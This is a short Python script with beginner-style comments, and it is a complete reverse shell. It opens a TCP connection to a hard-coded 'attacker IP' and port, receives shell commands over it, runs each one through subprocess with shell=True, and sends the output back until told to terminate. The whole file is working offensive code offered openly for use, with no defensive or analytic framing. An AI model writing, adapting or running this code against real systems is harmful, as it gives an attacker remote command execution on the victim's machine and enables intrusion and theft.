# first import all required module
import socket # for building TCP connection
import subprocess # to start a shell in system
import os # use this module for basic operation

os.system("clear || cls") # it clear the terminal screen
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
    s.connect(('192.168.2.107', 8080)) # here we define the attacker IP and the listening PORT
    ter = 'terminate' # we use this string to disconnect the connecton
    while True: # keep reciving commands from the machine
        command =  s.recv(1024) # read the first KB of the TCP socket
        if len(command) > 0:
            if ter.encode("utf-8") in command: # close the socket and break the loop
                s.close()
                break 
            else:
                cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                output_bytes = cmd.stdout.read() + cmd.stderr.read() # with help of send output or any error if it occue if any
                output_str = str(output_bytes, "utf-8") 
                s.send(str.encode(output_str + str(os.getcwd()) + '> ')) 

def main ():
    connect()

main()
